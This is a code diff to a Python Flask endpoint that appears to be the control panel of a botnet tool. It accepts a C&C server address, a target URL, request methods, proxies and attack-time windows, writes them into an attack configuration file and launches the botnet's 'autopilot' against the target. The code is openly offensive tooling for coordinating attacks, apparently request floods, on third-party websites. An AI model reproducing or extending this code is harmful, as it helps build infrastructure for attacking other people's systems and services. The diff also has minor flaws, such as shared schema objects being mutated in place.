@@ -19,7 +19,9 @@ import requests
 from requests.auth import HTTPBasicAuth
 import json
 import Botnet
+from collections import OrderedDict
 from utils.config import rootSchema, targetSchema, requestSchema
+
 
 app = Flask(__name__)
 
@@ -49,78 +51,85 @@ set to False.
 """
 @app.route("/submit", methods=['POST'])
 def performAttack():
-    if 'attack' in request.form:
-        if request.form['attack'] == 'begin':
+    if 'attack' in request.json:
+        if request.json['attack'] == 'begin':
+            print(request.json)
             # retrieving and polishing C&C server and prepare config file
-            cc_server = prepareConfigFile(request.form)
+            cc_server = prepareConfigFile(request.json)
             if '://' not in cc_server:
                 cc_server = 'http://' + cc_server
-            allsafe = Worker.AllSafeBotnet()
-            allsafe.autopilot(cc_server, './data/current_attack.txt', 5, override=False)
+            allsafe = Botnet.AllSafeBotnet()
+            allsafe.autopilot(cc_server, './data/current_attack.json', 5, override=False)
             return "OK", 200
-
+        else:
+            print(request.json['attack'])
+            return "Invalid request", 402
     else:
+        print(request.json)
         return "Forbidden!", 403
 
+def prepareConfigFile(params, where='./data/current_attack.json'):
 
-# def show_login_form():
-#     # The render template method will render an HTML page using Jinja2 template if any.
-#     return render_template("loginpage.html")
+    localRootSchema = rootSchema
 
+    # Only the useful key values will be changed accordingly
+    localRootSchema['last_modified'] = round(time())
+    localRootSchema['cc_server'] = params['cc_server']
 
-# def login(ip, username, password):
-#     #It will just valide the username and password and it will return the correct page
-#     try:
-#         isvalid = validate(ip, username, password)
-#     except requests.exceptions.RequestException as ReqExc:
-#         # TODO log?
-#         return "Page not found", 404
-#     if (isvalid):
-#         return redirect("http://" + ip, code=301)
-#     else:
-#         return abort(401)
-#
-#
-# def validate(ip, username, password):
-#
-#     response = requests.post("http://" + ip + '/login', auth=HTTPBasicAuth(username, password))
-#     if (response.status_code == 200):
-#         return True
-#     else:
-#         #even if the requests fails the login phase is aborted
-#         return False
+    # Creation of the locaTargetSchema based upon the TargetSchema
+    localTargetSchema = targetSchema
+    localTargetSchema['period'] = params['period']
+    localTargetSchema['max_count'] = params['max_count']
 
+    # Creation of the actionCondition dictionary
+    actionConditions = OrderedDict()
 
-def prepareConfigFile(params, where='./data/current_attack.txt'):
-    #The json file used as example will be used in order to not rwrite the already existing schema
-    file = open("./utils/config_schema_example.json", "r")
-    text = file.read()
-    configfile = json.loads(text)
-    file.close()
+    # If AMPM has been choosen both AM and PM will be set on 1
+    ampm = params['AMPM'];
+    if ampm == "AM":
+        actionConditions['AM'] = 1
+    if ampm == "PM":
+        actionConditions['PM'] = 1
+    if ampm == "AMPM":
+        actionConditions['AM'] = 1
+        actionConditions['PM'] = 1
 
-    #Only the useful key values will be changed accordingly #TODO more values to change
-    configfile['last_modified'] = round(time())
-    print(configfile['targets'])
-    paramconfig = configfile['targets'][0]['request_params']
-    paramconfig['method'] = params['method']
-    paramconfig['url'] = params['url']
-    new_res = []
-    for res in params['resources'].split(";"):
-        new_res.append(res)
-    paramconfig['resources'] = new_res
-    # TODO add prox
-    paramconfig['encoding'] = params['encoding']
-    configfile['targets'][0]['request_params'] = paramconfig
+    actionConditions['attack_time'] = params['hour_start'] + "-" + params['hour_end']
+    actionConditions['avoid_week'] = params['avoid_week']
+    actionConditions['avoid_month'] = params['avoid_month']
+
+    # ActionConditions is now poart of the localTargetSchema
+    localTargetSchema['action_conditions'] = actionConditions
+
+    # Creation of the requestSchema
+    localRequestSchema = requestSchema
+    localRequestSchema['method'] = params['method']
+    localRequestSchema['url'] = params['url']
+    localRequestSchema['resources'] = params['resources']
+    localRequestSchema['encoding'] = params['encoding']
+
+    # Creation of the proxy dictionary
+    proxy = OrderedDict()
+
+    # If an element has been specified as https, it will be handeld properly
+    for proxy_elem in params['proxy']:
+        if "https://" in proxy_elem:
+            proxy['https'] = proxy_elem
+        else:
+            proxy['http'] = proxy_elem
+
+    # Proxy is now part of localRequestSchema
+    localRequestSchema['proxy_server'] = proxy
+
+    # Final combination of the three schemas
+    localTargetSchema['request_params'] = localRequestSchema
+    localRootSchema['targets'].append(localTargetSchema)
+
     #The json configuration will be written
     file = open(where, "w")
-    file.write(json.dumps(configfile,indent=4))
+    file.write(json.dumps(localRootSchema,indent=4))
     file.close()
-    return paramconfig['cc_server']
-
-
-
-
-
+    return params['cc_server']
 
 
 
